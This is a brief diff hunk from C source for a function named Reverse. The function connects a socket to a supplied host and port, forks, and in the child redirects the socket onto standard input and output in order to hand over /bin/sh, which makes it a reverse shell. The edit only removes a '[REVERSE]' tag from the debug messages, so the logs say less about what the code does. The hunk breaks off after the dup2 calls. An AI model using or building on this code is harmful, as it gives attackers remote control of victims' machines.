@@ -29,13 +29,13 @@ void Reverse(const char *host, unsigned short port)
 	if(connect(sockfd, (struct sockaddr *)&hostinfo, sizeof(hostinfo)) == -1)
 		error_n(errno, "connect() @ Reverse()");
 
-	debugprint("-=[ [REVERSE] Connected to \"%s\"\n", host);
+	debugprint("-=[ Connected to \"%s\"\n", host);
 
 	if((pid = fork()) == -1)
 		error_n(errno, "fork() @ Reverse()");
 	else if(pid == 0){ // Child process sends a shell
-		debugprint("-=[ [REVERSE] Child process created [PID: %d]\n", getpid());
-		debugprint("-=[ [REVERSE] Sending /bin/sh to the port %d\n", port);
+		debugprint("-=[ Child process created [PID: %d]\n", getpid());
+		debugprint("-=[ Sending /bin/sh to the port %d\n", port);
 
 		dup2(sockfd, 0);
 		dup2(sockfd, 1);
